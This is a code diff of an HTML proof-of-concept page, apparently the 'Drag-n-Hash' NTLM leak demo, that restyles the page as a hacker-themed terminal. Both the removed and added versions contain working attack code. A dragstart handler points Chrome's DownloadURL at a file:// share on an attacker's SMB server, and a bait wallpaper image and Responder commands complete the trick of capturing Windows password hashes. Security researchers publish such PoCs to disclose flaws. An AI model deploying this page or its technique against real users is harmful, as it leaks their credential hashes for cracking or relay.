@@ -1,63 +1,92 @@
-<html>
+<!DOCTYPE html>
+<html lang="en" class="h-full bg-black text-green-200 font-mono">
 <head>
-	<title>TrustedSec POC</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>DragonHash ▸ NTLM PoC</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --accent:#38ff88;
+    }
+    html { font-family:'Source Code Pro', monospace; }
+    /* flicker */
+    @keyframes flicker{ 0%,19%,21%,23%,25%,54%,56%,100%{opacity:1;} 20%,24%,55%{opacity:0.25;} }
+    .flicker{ animation:flicker 3s infinite; }
+    /* fake scanlines */
+    .scanlines::before{
+      content:"";position:fixed;inset:0;pointer-events:none;
+      background-image:linear-gradient(rgba(0,0,0,0.15) 50%,transparent 50%);
+      background-size:100% 2px;mix-blend-mode:overlay;
+    }
+  </style>
 </head>
-<body>
-	<h1>TrustedSec Chrome Drag to Hash POC</h1>
-	<b><i>Instructions</i></b>
-	<p>Open this page on a Windows system in a chromium based browser</p>
-	<p>Run Responder on a system that the Windows computer can send SMB requests to</p>
-	<p>Enter the IP address of your Responder server below:</p>
-	<input type="text" id="responder-ip" placeholder="e.g., 10.0.0.5">
-	<p>Then you need to drag the image below to your desktop, and when Chrome fails hit the try again button in the downloads list</p>
-	<p>You should then have your hash captured in Responder</p>
+<body class="min-h-full flex flex-col scanlines">
+  <!-- Banner / "CRT" header -->
+  <header class="border-b border-green-600 py-6 px-4 text-center">
+    <h1 class="text-3xl md:text-4xl tracking-widest text-green-400 flicker select-none">[ Drag‑n‑Hash ]</h1>
+    <p class="mt-2 text-sm md:text-base text-green-300">Chromium drag‑and‑drop NTLM leakage proof‑of‑concept</p>
+  </header>
 
-	<h2>Epic Desktop Wallpaper for car lovers!</h2>
-	<i>Drag the image to your desktop to save the wallpaper!</i>
-	<br><br>
+  <main class="flex-grow flex items-start justify-center px-4 py-10">
+    <div class="w-full max-w-2xl space-y-10">
+      <!-- Terminal‑style Help -->
+      <section class="bg-black/80 border border-green-800 rounded-lg p-6 shadow-xl">
+        <pre class="whitespace-pre-wrap leading-relaxed text-sm md:text-base text-green-300"><code>$ # quick & dirty
+$ sudo responder -I eth0 -wrf
+$ export LISTENER_IP=&lt;your_ip&gt;
+$ #           ┌── drag this over to desktop ──┐
+$ #           ↓                              ↓</code></pre>
+        <p class="mt-4">Follow the prompts below · <span class="italic">“pwnage awaits”</span></p>
+      </section>
 
-	<img id="dragimg" src="dragnhash.png"
-	draggable="true"
-	style="cursor: grab; width: 500px;">
+      <!-- IP input -->
+      <section class="bg-black/80 border border-green-800 rounded-lg p-6 shadow-lg">
+        <h2 class="text-lg text-green-400 mb-2">1▸ Configure SMB lure server</h2>
+        <form id="ipForm" class="flex flex-col sm:flex-row gap-4">
+          <input type="text" id="ip" placeholder="192.168.56.1" required pattern="^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\\.|$)){4}$" class="flex-1 bg-transparent border border-green-600 focus:outline-none focus:ring-0 px-3 py-2 placeholder-green-700" />
+          <button type="submit" class="border border-green-500 hover:bg-green-600 hover:text-black px-4 py-2">save</button>
+        </form>
+        <p id="ipSaved" class="hidden mt-3 text-green-500">[+] IP locked · proceed</p>
+      </section>
 
-	<script type="text/javascript">
-		let dragging = false;
+      <!-- Bait image -->
+      <section class="bg-black/80 border border-green-800 rounded-lg p-6 shadow-lg">
+        <h2 class="text-lg text-green-400 mb-2">2▸ Weaponized asset</h2>
+        <div class="relative group">
+          <img id="bait" src="wallpaper.jpg" alt="Lure image" class="rounded border border-green-700 cursor-grab active:cursor-grabbing select-none mb-3" draggable="true">
+          <p class="text-green-500 text-xs">Drag the image to your desktop, then click <span class="underline">Retry</span> in Chrome's downloads bar.</p>
+        </div>
+      </section>
 
-		const element = document.getElementById('dragimg');
+      <!-- Disclaimer -->
+      <section class="text-xs text-green-600 text-center">
+        PoC crafted for educational use · Tested on Chrome 124 / Edge 124 · Use responsibly.
+      </section>
+    </div>
+  </main>
 
-		element.addEventListener('dragstart', (e) => {
-			dragging = true;
+  <footer class="border-t border-green-600 py-4 text-center text-xs text-green-600">
+    © 2025 TrustedSec Research · <a href="https://github.com/hoodoer/Drag-n-Hash" class="underline">view source</a>
+  </footer>
 
-			const ip = document.getElementById('responder-ip').value.trim() || "127.0.0.1";
-			const sharePath = `file://${ip}/SHARE/dragnhash.png`;
-			// This is the magic that points to our Responder hoping to snag hashes
-			e.dataTransfer.setData("DownloadURL", `image/png:dragnhash.png:${sharePath}`);
-
-			console.log(`Dragging image file to ${sharePath}`);
-		});
-
-
-		window.addEventListener('focus', () => {
-			if (dragging)
-			{
-				console.log("Mouse has returned after dragging!");
-				dragging = false;
-
-				fetch('dragnhash.png')
-				.then(res => res.blob())
-				.then(blob => {
-					const url = URL.createObjectURL(blob);
-					const a = document.createElement('a');
-					a.href = url;
-					a.download = 'dragnhash.png';
-					document.body.appendChild(a);
-					a.click();
-					document.body.removeChild(a);
-					URL.revokeObjectURL(url);
-				});
-			}
-		});
-
-	</script>
+  <!-- JS behaviour -->
+  <script>
+    const ipForm=document.getElementById('ipForm');
+    const bait=document.getElementById('bait');
+    const saved=document.getElementById('ipSaved');
+    let smbIP=null;
+    ipForm.addEventListener('submit', e=>{
+      e.preventDefault();
+      smbIP=document.getElementById('ip').value.trim();
+      saved.classList.remove('hidden');
+    });
+    bait.addEventListener('dragstart', e=>{
+      if(!smbIP){alert('⚠️  Enter listener IP first');return;}
+      const fileUrl=`file://${smbIP}/SHARE/dragRacer.jpg`;
+      e.dataTransfer.setData('DownloadURL',`image/png:dragRacer.jpg:${fileUrl}`);
+    });
+  </script>
 </body>
 </html>
